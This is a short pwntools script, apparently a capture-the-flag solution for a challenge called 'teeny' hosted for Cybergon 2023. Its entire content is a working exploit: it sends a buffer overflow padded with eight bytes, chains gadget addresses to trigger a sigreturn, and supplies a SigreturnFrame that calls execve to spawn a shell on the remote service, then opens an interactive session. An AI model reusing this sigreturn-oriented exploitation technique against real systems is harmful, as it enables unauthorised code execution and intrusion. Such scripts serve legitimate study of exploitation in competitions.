from pwn import *


context.arch = 'amd64' # necessary
# p = process("./teeny")
# gdb.attach(p)

p = remote("cybergon2023.webhop.me", 5004)
payload = SigreturnFrame()
payload.rax = 59
payload.rdi = 0x40238
payload.rsi = 0
payload.rdx = 0
payload.rip = 0x40015
p.sendline(b"A"*8 + p64(0x40018) + p64(0xf) + p64(0x40015) + bytes(payload))

p.interactive()